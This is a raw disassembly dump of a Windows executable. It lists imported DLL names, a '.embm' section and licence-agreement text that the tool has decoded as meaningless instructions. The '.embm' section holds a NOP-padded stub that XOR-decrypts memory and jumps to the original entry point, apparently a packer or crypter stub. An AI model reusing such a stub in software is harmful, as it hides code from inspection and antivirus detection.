  42dc78:	4e                   	dec    %esi
  42dc79:	45                   	inc    %ebp
  42dc7a:	54                   	push   %esp
  42dc7b:	2e 44                	cs inc %esp
  42dc7d:	4c                   	dec    %esp
  42dc7e:	4c                   	dec    %esp
  42dc7f:	00 28                	add    %ch,(%eax)
  42dc81:	d0 42 00             	rolb   $1,0x0(%edx)
  42dc84:	28 d0                	sub    %dl,%al
  42dc86:	42                   	inc    %edx
  42dc87:	00 28                	add    %ch,(%eax)
  42dc89:	d0 42 00             	rolb   $1,0x0(%edx)
  42dc8c:	4b                   	dec    %ebx
  42dc8d:	45                   	inc    %ebp
  42dc8e:	52                   	push   %edx
  42dc8f:	4e                   	dec    %esi
  42dc90:	45                   	inc    %ebp
  42dc91:	4c                   	dec    %esp
  42dc92:	33 32                	xor    (%edx),%esi
  42dc94:	2e 44                	cs inc %esp
  42dc96:	4c                   	dec    %esp
  42dc97:	4c                   	dec    %esp
  42dc98:	00 00                	add    %al,(%eax)
  42dc9a:	00 00                	add    %al,(%eax)
  42dc9c:	3c d0                	cmp    $0xd0,%al
  42dc9e:	42                   	inc    %edx
  42dc9f:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dca2:	42                   	inc    %edx
  42dca3:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dca6:	42                   	inc    %edx
  42dca7:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcaa:	42                   	inc    %edx
  42dcab:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcae:	42                   	inc    %edx
  42dcaf:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcb2:	42                   	inc    %edx
  42dcb3:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcb6:	42                   	inc    %edx
  42dcb7:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcba:	42                   	inc    %edx
  42dcbb:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcbe:	42                   	inc    %edx
  42dcbf:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcc2:	42                   	inc    %edx
  42dcc3:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcc6:	42                   	inc    %edx
  42dcc7:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcca:	42                   	inc    %edx
  42dccb:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcce:	42                   	inc    %edx
  42dccf:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcd2:	42                   	inc    %edx
  42dcd3:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcd6:	42                   	inc    %edx
  42dcd7:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcda:	42                   	inc    %edx
  42dcdb:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcde:	42                   	inc    %edx
  42dcdf:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dce2:	42                   	inc    %edx
  42dce3:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dce6:	42                   	inc    %edx
  42dce7:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcea:	42                   	inc    %edx
  42dceb:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcee:	42                   	inc    %edx
  42dcef:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcf2:	42                   	inc    %edx
  42dcf3:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcf6:	42                   	inc    %edx
  42dcf7:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcfa:	42                   	inc    %edx
  42dcfb:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dcfe:	42                   	inc    %edx
  42dcff:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd02:	42                   	inc    %edx
  42dd03:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd06:	42                   	inc    %edx
  42dd07:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd0a:	42                   	inc    %edx
  42dd0b:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd0e:	42                   	inc    %edx
  42dd0f:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd12:	42                   	inc    %edx
  42dd13:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd16:	42                   	inc    %edx
  42dd17:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd1a:	42                   	inc    %edx
  42dd1b:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd1e:	42                   	inc    %edx
  42dd1f:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd22:	42                   	inc    %edx
  42dd23:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd26:	42                   	inc    %edx
  42dd27:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd2a:	42                   	inc    %edx
  42dd2b:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd2e:	42                   	inc    %edx
  42dd2f:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd32:	42                   	inc    %edx
  42dd33:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd36:	42                   	inc    %edx
  42dd37:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd3a:	42                   	inc    %edx
  42dd3b:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd3e:	42                   	inc    %edx
  42dd3f:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd42:	42                   	inc    %edx
  42dd43:	00 3c d0             	add    %bh,(%eax,%edx,8)
  42dd46:	42                   	inc    %edx
  42dd47:	00 55 53             	add    %dl,0x53(%ebp)
  42dd4a:	45                   	inc    %ebp
  42dd4b:	52                   	push   %edx
  42dd4c:	33 32                	xor    (%edx),%esi
  42dd4e:	2e 44                	cs inc %esp
  42dd50:	4c                   	dec    %esp
  42dd51:	4c                   	dec    %esp
  42dd52:	00 00                	add    %al,(%eax)
  42dd54:	50                   	push   %eax
  42dd55:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd58:	50                   	push   %eax
  42dd59:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd5c:	50                   	push   %eax
  42dd5d:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd60:	50                   	push   %eax
  42dd61:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd64:	50                   	push   %eax
  42dd65:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd68:	50                   	push   %eax
  42dd69:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd6c:	50                   	push   %eax
  42dd6d:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd70:	50                   	push   %eax
  42dd71:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd74:	50                   	push   %eax
  42dd75:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd78:	50                   	push   %eax
  42dd79:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd7c:	50                   	push   %eax
  42dd7d:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd80:	50                   	push   %eax
  42dd81:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd84:	50                   	push   %eax
  42dd85:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd88:	50                   	push   %eax
  42dd89:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd8c:	50                   	push   %eax
  42dd8d:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd90:	50                   	push   %eax
  42dd91:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd94:	50                   	push   %eax
  42dd95:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd98:	50                   	push   %eax
  42dd99:	d0 42 00             	rolb   $1,0x0(%edx)
  42dd9c:	50                   	push   %eax
  42dd9d:	d0 42 00             	rolb   $1,0x0(%edx)
  42dda0:	50                   	push   %eax
  42dda1:	d0 42 00             	rolb   $1,0x0(%edx)
  42dda4:	50                   	push   %eax
  42dda5:	d0 42 00             	rolb   $1,0x0(%edx)
  42dda8:	50                   	push   %eax
  42dda9:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddac:	50                   	push   %eax
  42ddad:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddb0:	50                   	push   %eax
  42ddb1:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddb4:	50                   	push   %eax
  42ddb5:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddb8:	50                   	push   %eax
  42ddb9:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddbc:	50                   	push   %eax
  42ddbd:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddc0:	50                   	push   %eax
  42ddc1:	d0 42 00             	rolb   $1,0x0(%edx)
  42ddc4:	47                   	inc    %edi
  42ddc5:	44                   	inc    %esp
  42ddc6:	49                   	dec    %ecx
  42ddc7:	33 32                	xor    (%edx),%esi
  42ddc9:	2e 44                	cs inc %esp
  42ddcb:	4c                   	dec    %esp
  42ddcc:	4c                   	dec    %esp
  42ddcd:	00 00                	add    %al,(%eax)
  42ddcf:	00 64 d0 42          	add    %ah,0x42(%eax,%edx,8)
  42ddd3:	00 64 d0 42          	add    %ah,0x42(%eax,%edx,8)
  42ddd7:	00 64 d0 42          	add    %ah,0x42(%eax,%edx,8)
  42dddb:	00 64 d0 42          	add    %ah,0x42(%eax,%edx,8)
  42dddf:	00 64 d0 42          	add    %ah,0x42(%eax,%edx,8)
  42dde3:	00 41 44             	add    %al,0x44(%ecx)
  42dde6:	56                   	push   %esi
  42dde7:	41                   	inc    %ecx
  42dde8:	50                   	push   %eax
  42dde9:	49                   	dec    %ecx
  42ddea:	33 32                	xor    (%edx),%esi
  42ddec:	2e 44                	cs inc %esp
  42ddee:	4c                   	dec    %esp
  42ddef:	4c                   	dec    %esp
  42ddf0:	00 00                	add    %al,(%eax)
  42ddf2:	00 00                	add    %al,(%eax)
  42ddf4:	78 d0                	js     0x42ddc6
  42ddf6:	42                   	inc    %edx
  42ddf7:	00 78 d0             	add    %bh,-0x30(%eax)
  42ddfa:	42                   	inc    %edx
  42ddfb:	00 78 d0             	add    %bh,-0x30(%eax)
  42ddfe:	42                   	inc    %edx
  42ddff:	00 78 d0             	add    %bh,-0x30(%eax)
  42de02:	42                   	inc    %edx
  42de03:	00 78 d0             	add    %bh,-0x30(%eax)
  42de06:	42                   	inc    %edx
  42de07:	00 78 d0             	add    %bh,-0x30(%eax)
  42de0a:	42                   	inc    %edx
  42de0b:	00 78 d0             	add    %bh,-0x30(%eax)
  42de0e:	42                   	inc    %edx
  42de0f:	00 78 d0             	add    %bh,-0x30(%eax)
  42de12:	42                   	inc    %edx
  42de13:	00 43 52             	add    %al,0x52(%ebx)
  42de16:	54                   	push   %esp
  42de17:	44                   	inc    %esp
  42de18:	4c                   	dec    %esp
  42de19:	4c                   	dec    %esp
  42de1a:	2e 44                	cs inc %esp
  42de1c:	4c                   	dec    %esp
  42de1d:	4c                   	dec    %esp
  42de1e:	00 00                	add    %al,(%eax)
  42de20:	8c d0                	mov    %ss,%eax
  42de22:	42                   	inc    %edx
  42de23:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de2a:	42                   	inc    %edx
  42de2b:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de32:	42                   	inc    %edx
  42de33:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de3a:	42                   	inc    %edx
  42de3b:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de42:	42                   	inc    %edx
  42de43:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de4a:	42                   	inc    %edx
  42de4b:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de52:	42                   	inc    %edx
  42de53:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de5a:	42                   	inc    %edx
  42de5b:	00 8c d0 42 00 8c d0 	add    %cl,-0x2f73ffbe(%eax,%edx,8)
  42de62:	42                   	inc    %edx
  42de63:	00                   	.byte 0
  42de64:	8c d0                	mov    %ss,%eax
  42de66:	42                   	inc    %edx
	...

Disassembly of section .embm:

0042e000 <.embm>:
  42e000:	90                   	nop
  42e001:	60                   	pusha
  42e002:	90                   	nop
  42e003:	90                   	nop
  42e004:	90                   	nop
  42e005:	90                   	nop
  42e006:	67 e8 00 00 00 00    	addr16 call 0x42e00c
  42e00c:	90                   	nop
  42e00d:	90                   	nop
  42e00e:	90                   	nop
  42e00f:	90                   	nop
  42e010:	58                   	pop    %eax
  42e011:	90                   	nop
  42e012:	05 c5 3a 40 00       	add    $0x403ac5,%eax
  42e017:	90                   	nop
  42e018:	90                   	nop
  42e019:	2d 6b 3a 40 00       	sub    $0x403a6b,%eax
  42e01e:	90                   	nop
  42e01f:	8b 18                	mov    (%eax),%ebx
  42e021:	90                   	nop
  42e022:	90                   	nop
  42e023:	90                   	nop
  42e024:	90                   	nop
  42e025:	8b 48 04             	mov    0x4(%eax),%ecx
  42e028:	90                   	nop
  42e029:	90                   	nop
  42e02a:	90                   	nop
  42e02b:	90                   	nop
  42e02c:	8b 50 08             	mov    0x8(%eax),%edx
  42e02f:	90                   	nop
  42e030:	90                   	nop
  42e031:	90                   	nop
  42e032:	90                   	nop
  42e033:	90                   	nop
  42e034:	31 13                	xor    %edx,(%ebx)
  42e036:	90                   	nop
  42e037:	90                   	nop
  42e038:	90                   	nop
  42e039:	83 c3 04             	add    $0x4,%ebx
  42e03c:	90                   	nop
  42e03d:	90                   	nop
  42e03e:	90                   	nop
  42e03f:	90                   	nop
  42e040:	39 cb                	cmp    %ecx,%ebx
  42e042:	90                   	nop
  42e043:	7c eb                	jl     0x42e030
  42e045:	90                   	nop
  42e046:	90                   	nop
  42e047:	90                   	nop
  42e048:	90                   	nop
  42e049:	90                   	nop
  42e04a:	90                   	nop
  42e04b:	83 c0 0c             	add    $0xc,%eax
  42e04e:	83 38 00             	cmpl   $0x0,(%eax)
  42e051:	90                   	nop
  42e052:	90                   	nop
  42e053:	90                   	nop
  42e054:	90                   	nop
  42e055:	90                   	nop
  42e056:	90                   	nop
  42e057:	75 c5                	jne    0x42e01e
  42e059:	90                   	nop
  42e05a:	61                   	popa
  42e05b:	90                   	nop
  42e05c:	90                   	nop
  42e05d:	90                   	nop
  42e05e:	90                   	nop
  42e05f:	90                   	nop
  42e060:	67 e9 b3 31 fd ff    	addr16 jmp 0x401219
  42e066:	00 10                	add    %dl,(%eax)
  42e068:	40                   	inc    %eax
  42e069:	00 f8                	add    %bh,%al
  42e06b:	7e 40                	jle    0x42e0ad
  42e06d:	00 68 64             	add    %ch,0x64(%eax)
  42e070:	3a 66 00             	cmp    0x0(%esi),%ah
  42e073:	a0 42 00 70 cd       	mov    0xcd700042,%al
  42e078:	42                   	inc    %edx
  42e079:	00 80 23 ae 47 00    	add    %al,0x47ae23(%eax)
	...
  42e087:	00 00                	add    %al,(%eax)
  42e089:	00 67 e9             	add    %ah,-0x17(%edi)
  42e08c:	89 31                	mov    %esi,(%ecx)
  42e08e:	fd                   	std
  42e08f:	ff 00                	incl   (%eax)
	...
  42e099:	00 00                	add    %al,(%eax)
  42e09b:	00 50 90             	add    %dl,-0x70(%eax)
  42e09e:	90                   	nop
  42e09f:	90                   	nop
  42e0a0:	90                   	nop
  42e0a1:	90                   	nop
  42e0a2:	90                   	nop
  42e0a3:	90                   	nop
  42e0a4:	90                   	nop
  42e0a5:	90                   	nop
  42e0a6:	89 c8                	mov    %ecx,%eax
  42e0a8:	90                   	nop
  42e0a9:	90                   	nop
  42e0aa:	f7 f7                	div    %edi
  42e0ac:	90                   	nop
  42e0ad:	90                   	nop
  42e0ae:	90                   	nop
  42e0af:	90                   	nop
  42e0b0:	91                   	xchg   %eax,%ecx
  42e0b1:	90                   	nop
  42e0b2:	90                   	nop
  42e0b3:	90                   	nop
  42e0b4:	90                   	nop
  42e0b5:	90                   	nop
  42e0b6:	90                   	nop
  42e0b7:	90                   	nop
  42e0b8:	58                   	pop    %eax
  42e0b9:	90                   	nop
  42e0ba:	90                   	nop
  42e0bb:	be 3e 77 80 4e       	mov    $0x4e80773e,%esi
  42e0c0:	90                   	nop
  42e0c1:	31 30                	xor    %esi,(%eax)
  42e0c3:	90                   	nop
  42e0c4:	90                   	nop
  42e0c5:	90                   	nop
  42e0c6:	90                   	nop
  42e0c7:	90                   	nop
  42e0c8:	90                   	nop
  42e0c9:	90                   	nop
  42e0ca:	01 f8                	add    %edi,%eax
  42e0cc:	90                   	nop
  42e0cd:	e2 f1                	loop   0x42e0c0
  42e0cf:	90                   	nop
  42e0d0:	90                   	nop
  42e0d1:	90                   	nop
  42e0d2:	90                   	nop
  42e0d3:	61                   	popa
  42e0d4:	90                   	nop
  42e0d5:	90                   	nop
  42e0d6:	90                   	nop
  42e0d7:	90                   	nop
  42e0d8:	67 e9 3b 31 fd ff    	addr16 jmp 0x401219
	...

Disassembly of section .data:

00436000 <.data>:
  436000:	43                   	inc    %ebx
  436001:	4f                   	dec    %edi
  436002:	4e                   	dec    %esi
  436003:	53                   	push   %ebx
  436004:	55                   	push   %ebp
  436005:	4d                   	dec    %ebp
  436006:	45                   	inc    %ebp
  436007:	52                   	push   %edx
  436008:	20 52 49             	and    %dl,0x49(%edx)
  43600b:	47                   	inc    %edi
  43600c:	48                   	dec    %eax
  43600d:	54                   	push   %esp
  43600e:	53                   	push   %ebx
  43600f:	20 55 4e             	and    %dl,0x4e(%ebp)
  436012:	44                   	inc    %esp
  436013:	45                   	inc    %ebp
  436014:	52                   	push   %edx
  436015:	20 59 4f             	and    %bl,0x4f(%ecx)
  436018:	55                   	push   %ebp
  436019:	52                   	push   %edx
  43601a:	20 4c 4f 43          	and    %cl,0x43(%edi,%ecx,2)
  43601e:	41                   	inc    %ecx
  43601f:	4c                   	dec    %esp
  436020:	20 4c 41 57          	and    %cl,0x57(%ecx,%eax,2)
  436024:	53                   	push   %ebx
  436025:	20 57 48             	and    %dl,0x48(%edi)
  436028:	49                   	dec    %ecx
  436029:	43                   	inc    %ebx
  43602a:	48                   	dec    %eax
  43602b:	20 54 48 49          	and    %dl,0x49(%eax,%ecx,2)
  43602f:	53                   	push   %ebx
  436030:	20 41 47             	and    %al,0x47(%ecx)
  436033:	52                   	push   %edx
  436034:	45                   	inc    %ebp
  436035:	45                   	inc    %ebp
  436036:	4d                   	dec    %ebp
  436037:	45                   	inc    %ebp
  436038:	4e                   	dec    %esi
  436039:	54                   	push   %esp
  43603a:	20 43 41             	and    %al,0x41(%ebx)
  43603d:	4e                   	dec    %esi
  43603e:	4e                   	dec    %esi
  43603f:	4f                   	dec    %edi
  436040:	54                   	push   %esp
  436041:	20 43 48             	and    %al,0x48(%ebx)
  436044:	41                   	inc    %ecx
  436045:	20 4e 47             	and    %cl,0x47(%esi)
  436048:	45                   	inc    %ebp
  436049:	2e 20 54 4f 0a       	and    %dl,%cs:0xa(%edi,%ecx,2)
  43604e:	49                   	dec    %ecx
  43604f:	6e                   	outsb  %ds:(%esi),(%dx)
  436050:	74 65                	je     0x4360b7
  436052:	72 6e                	jb     0x4360c2
  436054:	65 74 20             	gs je  0x436077
  436057:	54                   	push   %esp
  436058:	69 6d 65 2c 20 61 20 	imul   $0x2061202c,0x65(%ebp),%ebp
  43605f:	70 65                	jo     0x4360c6
  436061:	72 73                	jb     0x4360d6
  436063:	6f                   	outsl  %ds:(%esi),(%dx)
  436064:	6e                   	outsb  %ds:(%esi),(%dx)
  436065:	20 69 73             	and    %ch,0x73(%ecx)
  436068:	20 64 65 66          	and    %ah,0x66(%ebp,%eiz,2)
  43606c:	69 6e 65 64 20 61 73 	imul   $0x73612064,0x65(%esi),%ebp
  436073:	20 61 6e             	and    %ah,0x6e(%ecx)
  436076:	20 69 6e             	and    %ch,0x6e(%ecx)
  436079:	64 69 76 69 64 75 61 	imul   $0x6c617564,%fs:0x69(%esi),%esi
  436080:	6c 
  436081:	20 77 68             	and    %dh,0x68(%edi)
  436084:	6f                   	outsl  %ds:(%esi),(%dx)
  436085:	20 69 73             	and    %ch,0x73(%ecx)
  436088:	20 63 68             	and    %ah,0x68(%ebx)
  43608b:	61                   	popa
  43608c:	72 67                	jb     0x4360f5
  43608e:	69 6e 67 20 74 69 6d 	imul   $0x6d697420,0x67(%esi),%ebp
  436095:	65 20 74 6f 20       	and    %dh,%gs:0x20(%edi,%ebp,2)
  43609a:	61                   	popa
  43609b:	20 70 72             	and    %dh,0x72(%eax)
  43609e:	6f                   	outsl  %ds:(%esi),(%dx)
  43609f:	6a 65                	push   $0x65
  4360a1:	63 74 20 76          	arpl   %esi,0x76(%eax,%eiz,1)
  4360a5:	69 61 20 74 68 65 20 	imul   $0x20656874,0x20(%ecx),%esp
  4360ac:	61                   	popa
  4360ad:	70 70                	jo     0x43611f
  4360af:	6c                   	insb   (%dx),%es:(%edi)
  4360b0:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4360b7:	2e 20 54 68 65       	and    %dl,%cs:0x65(%eax,%ebp,2)
  4360bc:	20 74 6f 74          	and    %dh,0x74(%edi,%ebp,2)
  4360c0:	61                   	popa
  4360c1:	6c                   	insb   (%dx),%es:(%edi)
  4360c2:	20 6e 75             	and    %ch,0x75(%esi)
  4360c5:	6d                   	insl   (%dx),%es:(%edi)
  4360c6:	62 65 72             	bound  %esp,0x72(%ebp)
  4360c9:	20 6f 66             	and    %ch,0x66(%edi)
  4360cc:	0a 70 75             	or     0x75(%eax),%dh
  4360cf:	72 70                	jb     0x436141
  4360d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4360d2:	73 65                	jae    0x436139
  4360d4:	73 20                	jae    0x4360f6
  4360d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4360d7:	66 20 63 6f          	data16 and %ah,0x6f(%ebx)
  4360db:	75 6e                	jne    0x43614b
  4360dd:	74 69                	je     0x436148
  4360df:	6e                   	outsb  %ds:(%esi),(%dx)
  4360e0:	67 20 74 68          	and    %dh,0x68(%si)
  4360e4:	65 20 6e 75          	and    %ch,%gs:0x75(%esi)
  4360e8:	6d                   	insl   (%dx),%es:(%edi)
  4360e9:	62 65 72             	bound  %esp,0x72(%ebp)
  4360ec:	20 6f 66             	and    %ch,0x66(%edi)
  4360ef:	20 70 72             	and    %dh,0x72(%eax)
  4360f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4360f3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4360f6:	73 6f                	jae    0x436167
  4360f8:	72 73                	jb     0x43616d
  4360fa:	20 77 68             	and    %dh,0x68(%edi)
  4360fd:	69 63 68 20 72 65 71 	imul   $0x71657220,0x68(%ebx),%esp
  436104:	75 69                	jne    0x43616f
  436106:	72 65                	jb     0x43616d
  436108:	20 6c 69 63          	and    %ch,0x63(%ecx,%ebp,2)
  43610c:	65 6e                	outsb  %gs:(%esi),(%dx)
  43610e:	73 69                	jae    0x436179
  436110:	6e                   	outsb  %ds:(%esi),(%dx)
  436111:	67 2c 20             	addr16 sub $0x20,%al
  436114:	61                   	popa
  436115:	20 6d 75             	and    %ch,0x75(%ebp)
  436118:	6c                   	insb   (%dx),%es:(%edi)
  436119:	74 69                	je     0x436184
  43611b:	63 6f 72             	arpl   %ebp,0x72(%edi)
  43611e:	65 20 63 68          	and    %ah,%gs:0x68(%ebx)
  436122:	69 70 20 77 69 74 68 	imul   $0x68746977,0x20(%eax),%esi
  436129:	20 22                	and    %ah,(%edx)
  43612b:	6e                   	outsb  %ds:(%esi),(%dx)
  43612c:	22 20                	and    (%eax),%ah
  43612e:	70 72                	jo     0x4361a2
  436130:	6f                   	outsl  %ds:(%esi),(%dx)
  436131:	63 65 73             	arpl   %esp,0x73(%ebp)
  436134:	73 6f                	jae    0x4361a5
  436136:	72 20                	jb     0x436158
  436138:	63 6f 72             	arpl   %ebp,0x72(%edi)
  43613b:	65 73 20             	gs jae 0x43615e
  43613e:	73 68                	jae    0x4361a8
  436140:	61                   	popa
  436141:	6c                   	insb   (%dx),%es:(%edi)
  436142:	6c                   	insb   (%dx),%es:(%edi)
  436143:	20 62 65             	and    %ah,0x65(%edx)
  436146:	0a 4f 6e             	or     0x6e(%edi),%cl
  436149:	6c                   	insb   (%dx),%es:(%edi)
  43614a:	69 6e 65 20 48 6f 73 	imul   $0x736f4820,0x65(%esi),%ebp
  436151:	74 69                	je     0x4361bc
  436153:	6e                   	outsb  %ds:(%esi),(%dx)
  436154:	67 20 41 63          	and    %al,0x63(%bx,%di)
  436158:	63 65 73             	arpl   %esp,0x73(%ebp)
  43615b:	73 20                	jae    0x43617d
  43615d:	50                   	push   %eax
  43615e:	6f                   	outsl  %ds:(%esi),(%dx)
  43615f:	6c                   	insb   (%dx),%es:(%edi)
  436160:	69 63 69 65 73 2e 20 	imul   $0x202e7365,0x69(%ebx),%esp
  436167:	4f                   	dec    %edi
  436168:	72 61                	jb     0x4361cb
  43616a:	63 6c 65 20          	arpl   %ebp,0x20(%ebp,%eiz,2)
  43616e:	55                   	push   %ebp
  43616f:	6e                   	outsb  %ds:(%esi),(%dx)
  436170:	69 76 65 72 73 69 74 	imul   $0x74697372,0x65(%esi),%esi
  436177:	79 27                	jns    0x4361a0
  436179:	73 20                	jae    0x43619b
  43617b:	4f                   	dec    %edi
  43617c:	6e                   	outsb  %ds:(%esi),(%dx)
  43617d:	6c                   	insb   (%dx),%es:(%edi)
  43617e:	69 6e 65 20 48 6f 73 	imul   $0x736f4820,0x65(%esi),%ebp
  436185:	74 69                	je     0x4361f0
  436187:	6e                   	outsb  %ds:(%esi),(%dx)
  436188:	67 20 41 63          	and    %al,0x63(%bx,%di)
  43618c:	63 65 73             	arpl   %esp,0x73(%ebp)
  43618f:	73 20                	jae    0x4361b1
  436191:	50                   	push   %eax
  436192:	6f                   	outsl  %ds:(%esi),(%dx)
  436193:	6c                   	insb   (%dx),%es:(%edi)
  436194:	69 63 69 65 73 20 61 	imul   $0x61207365,0x69(%ebx),%esp
  43619b:	72 65                	jb     0x436202
  43619d:	20 6c 6f 63          	and    %ch,0x63(%edi,%ebp,2)
  4361a1:	61                   	popa
  4361a2:	74 65                	je     0x436209
  4361a4:	64 20 61 74          	and    %ah,%fs:0x74(%ecx)
  4361a8:	0a 6c 69 63          	or     0x63(%ecx,%ebp,2),%ch
  4361ac:	65 6e                	outsb  %gs:(%esi),(%dx)
  4361ae:	73 65                	jae    0x436215
  4361b0:	73 20                	jae    0x4361d2
  4361b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4361b3:	65 65 64 65 64 20 69 	gs gs fs gs and %ch,%fs:0x73(%ecx)
  4361ba:	73 
  4361bb:	20 74 6f 20          	and    %dh,0x20(%edi,%ebp,2)
  4361bf:	62 65 20             	bound  %esp,0x20(%ebp)
  4361c2:	62 61 73             	bound  %esp,0x73(%ecx)
  4361c5:	65 64 20 6f 6e       	gs and %ch,%fs:0x6e(%edi)
  4361ca:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  4361ce:	20 70 65             	and    %dh,0x65(%eax)
  4361d1:	61                   	popa
  4361d2:	6b 20 6e             	imul   $0x6e,(%eax),%esp
  4361d5:	75 6d                	jne    0x436244
  4361d7:	62 65 72             	bound  %esp,0x72(%ebp)
  4361da:	20 6f 66             	and    %ch,0x66(%edi)
  4361dd:	20 70 61             	and    %dh,0x61(%eax)
  4361e0:	72 74                	jb     0x436256
  4361e2:	2d 74 69 6d 65       	sub    $0x656d6974,%eax
  4361e7:	20 61 6e             	and    %ah,0x6e(%ecx)
  4361ea:	64 20 66 75          	and    %ah,%fs:0x75(%esi)
  4361ee:	6c                   	insb   (%dx),%es:(%edi)
  4361ef:	6c                   	insb   (%dx),%es:(%edi)
  4361f0:	2d 74 69 6d 65       	sub    $0x656d6974,%eax
  4361f5:	20 70 65             	and    %dh,0x65(%eax)
  4361f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4361f9:	70 6c                	jo     0x436267
  4361fb:	65 20 77 68          	and    %dh,%gs:0x68(%edi)
  4361ff:	6f                   	outsl  %ds:(%esi),(%dx)
  436200:	73 65                	jae    0x436267
  436202:	20 72 65             	and    %dh,0x65(%edx)
  436205:	63 6f 72             	arpl   %ebp,0x72(%edi)
  436208:	64 73 20             	fs jae 0x43622b
  43620b:	61                   	popa
  43620c:	72 65                	jb     0x436273
  43620e:	20 72 65             	and    %dh,0x65(%edx)
  436211:	63 6f 72             	arpl   %ebp,0x72(%edi)
  436214:	64 65 64 20 69 6e    	fs gs and %ch,%fs:0x6e(%ecx)
  43621a:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43621e:	20 73 79             	and    %dh,0x79(%ebx)
  436221:	73 74                	jae    0x436297
  436223:	65 6d                	gs insl (%dx),%es:(%edi)
  436225:	2e 0a 61 6e          	or     %cs:0x6e(%ecx),%ah
  436229:	64 20 76 69          	and    %dh,%fs:0x69(%esi)
  43622d:	72 74                	jb     0x4362a3
  43622f:	75 61                	jne    0x436292
  436231:	6c                   	insb   (%dx),%es:(%edi)
  436232:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  436239:	2c 20                	sub    $0x20,%al
  43623b:	73 65                	jae    0x4362a2
  43623d:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  436242:	20 41 64             	and    %al,0x64(%ecx)
  436245:	64 69 74 69 6f 6e 61 	imul   $0x206c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  43624c:	6c 20 
  43624e:	54                   	push   %esp
  43624f:	65 72 6d             	gs jb  0x4362bf
  436252:	73 2e                	jae    0x436282
  436254:	0a 66 72             	or     0x72(%esi),%ah
  436257:	6f                   	outsl  %ds:(%esi),(%dx)
